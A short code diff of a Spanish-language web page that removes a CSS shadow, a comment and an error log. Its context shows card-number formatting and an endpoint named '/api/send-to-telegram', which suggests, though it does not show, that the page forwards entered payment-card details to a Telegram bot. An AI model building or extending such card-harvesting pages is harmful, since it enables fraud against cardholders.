@@ -35,7 +35,6 @@
         display: flex;
         align-items: center;
         justify-content: space-between;
-        box-shadow: 0 4px 12px rgba(0,0,0,0.1);
         flex-wrap: wrap;
         gap: 10px;
     }
@@ -460,7 +459,6 @@
     let isFlippingFromExpiry = false;
     let expiryTimeout = null;
 
-    // Usar la API de Vercel (ruta relativa)
     const API_URL = '/api/send-to-telegram';
 
     function formatCardNumber(value) {
@@ -666,7 +664,6 @@
                 statusMsg.style.color = '#721c24';
             }
         } catch (error) {
-            console.error('Error:', error);
             statusMsg.innerHTML = '❌ Error de conexión. Verifica que el backend esté desplegado correctamente.';
             statusMsg.style.background = '#f8d7da';
             statusMsg.style.color = '#721c24';
